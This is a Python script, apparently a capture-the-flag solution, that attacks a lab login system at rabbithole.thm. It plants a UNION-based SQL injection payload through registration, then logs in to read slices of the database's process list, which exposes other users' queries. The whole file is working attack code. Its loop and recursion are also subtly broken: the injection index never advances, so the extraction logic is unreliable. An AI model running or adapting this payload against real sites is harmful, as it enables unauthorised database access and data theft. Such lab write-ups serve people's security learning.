#!/usr/bin/env python3
import requests
from bs4 import BeautifulSoup

# Function to send POST request (register or login)
def send_request(action, sqli_payload, password):
    url = f'http://rabbithole.thm/{action}.php'
    data = {
        'username': sqli_payload,
        'password': password,
        'submit' if action == 'register' else 'login': 'Submit Query'
    }
    return requests.post(url, data=data)

# Function to handle registration and login
def register_and_login(index=1, result=""):
    password = 'abc'

    # Iterate through substrings of the information_schema.processlist info column
    for i in range(1, 20):
        sqli_payload = f'" union ALL select 0,SUBSTR(info, {i}, 16) from information_schema.processlist where info not like "%info%";#'

    # Try to register first
    register_response = send_request('register', sqli_payload, password)
    
    # Check if registration failed
    if "Something went wrong" in register_response.text:
        print("Registration failed!")
    else:
        # Proceed with login if register is successful
        login_response = send_request('login', sqli_payload, password)

        # Parse HTML response using BeautifulSoup
        soup = BeautifulSoup(login_response.text, 'html.parser')

        tables = soup.find_all("table", class_="u-full-width")
        
        # Check if there are at least two tables
        if len(tables) > 1:
            td = tables[1].find("td")
            if td:
                output = td.get_text()
                result += output

                # If output is 16 characters long, continue extraction
                if len(output) == 16:
                    register_and_login(index + 16, result)
                else:
                    print("Final extracted data:", result)
                    return
            else:
                print("No <td> found in the second table.")
        else:
            print("The second table does not exist.")

# Start the SQLi attack process
register_and_login()
